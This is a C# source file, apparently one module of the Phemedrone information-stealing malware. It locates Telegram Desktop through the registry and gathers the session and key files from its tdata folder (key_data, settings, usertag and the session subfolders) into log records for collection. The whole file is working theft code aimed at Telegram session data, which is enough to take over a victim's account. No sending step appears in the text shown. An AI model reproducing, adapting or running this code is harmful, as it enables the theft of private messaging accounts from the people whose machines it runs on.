using System;
using Microsoft.Win32;
using System.IO;
using Phemedrone.Classes;
using System.Collections.Generic;
using System.Linq;
using Phemedrone.Extensions;

namespace Phemedrone.Services
{
    public class Telegram : IService
    {
        public override PriorityLevel Priority => PriorityLevel.Medium;

        protected override LogRecord[] Collect()
        {
            var array = new List<LogRecord>();
            
            var path = Registry.GetValue("HKEY_CLASSES_ROOT\\tg\\DefaultIcon", null, "")?
                .ToString();
            if (path == null) return array.ToArray();
            
            path = new FileInfo(path.Substring(1, path.Length - 2).Split(',')[0]).DirectoryName;
            if (path == null) return array.ToArray();
            
            path = Path.Combine(path, "tdata");
            if (!Directory.Exists(path)) return array.ToArray();

            void AddFile(string fullPath)
            {
                var content = NullableValue.Call(() => File.ReadAllBytes(fullPath));
                if (content == null) return;
                
                array.Add(new LogRecord
                {
                    Path = "Messengers/Telegram/" + fullPath.Replace(path + "\\", null),
                    Content = content
                });
            }
            
            foreach (var file in Directory.GetFiles(path))
            {
                var fileInfo = new FileInfo(file);

                if (fileInfo.Length > 5120)
                {
                    AddFile(file);
                } else if (fileInfo.Name.EndsWith("s") && fileInfo.Name.Length == 17)
                {
                    AddFile(file);
                }
                else
                {
                    var prefixes = new[]
                    {
                        "usertag",
                        "settings",
                        "key_data",
                        "prefix"
                    };
                    if (prefixes.Any(prefix => fileInfo.Name.StartsWith(prefix)))
                    {
                        AddFile(file);
                    }
                }
            }

            foreach (var directory in Directory.GetDirectories(path))
            {
                var directoryName = directory.Split('\\').Last();
                if (directoryName.Length == 16)
                {
                    foreach (var file in Directory.GetFiles(directory))
                    {
                        AddFile(file);
                    }
                }
            }
            return array.ToArray();
        }
    }
}